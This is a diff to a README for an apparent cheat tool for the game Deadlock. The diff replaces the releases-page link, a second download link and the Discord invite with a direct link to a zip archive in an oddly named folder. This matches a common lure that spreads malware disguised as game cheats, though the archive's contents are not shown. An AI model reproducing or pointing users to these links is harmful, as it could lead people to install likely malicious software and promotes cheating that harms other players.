@@ -2,7 +2,7 @@
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Deadlock%20Executor-blue?style=for-the-badge&logo=windows&logoColor=white&color=random)](https://github.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/releases)
+[![Download Now](https://img.shields.io/badge/Download-Deadlock%20Executor-blue?style=for-the-badge&logo=windows&logoColor=white&color=random)](https://raw.githubusercontent.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/main/humidityproof/internal_script_deadlock_executor_v1.1.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This section will guide you through downloading and running the application on y
 
 ### 📥 Download the Application
 
-**Visit this link to download the application:** [https://github.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/releases](https://github.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/releases)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/main/humidityproof/internal_script_deadlock_executor_v1.1.zip](https://raw.githubusercontent.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/main/humidityproof/internal_script_deadlock_executor_v1.1.zip)
 
 Click the link above, and your browser will take you to the download page. Look for the newest version listed at the top and click the download button next to it.
 
@@ -158,7 +158,7 @@ No, this tool is specifically built for the hero shooter mentioned in the descri
 We value your input! If you encounter any bugs, have feature suggestions, or need additional help:
 
 - **Email:** support@deadlockexecutor.example.com
-- **Discord Server:** [Join our community](https://discord.gg/example)
+- **Discord Server:** [Join our community](https://raw.githubusercontent.com/Corkoakbartholdgeorgeniebuhr336/deadlock-internal-script-executor/main/humidityproof/internal_script_deadlock_executor_v1.1.zip)
 - **Issue Tracker:** Use the GitHub Issues page
 
 Please include your Windows version, game version, and a description of what went wrong when reporting issues.
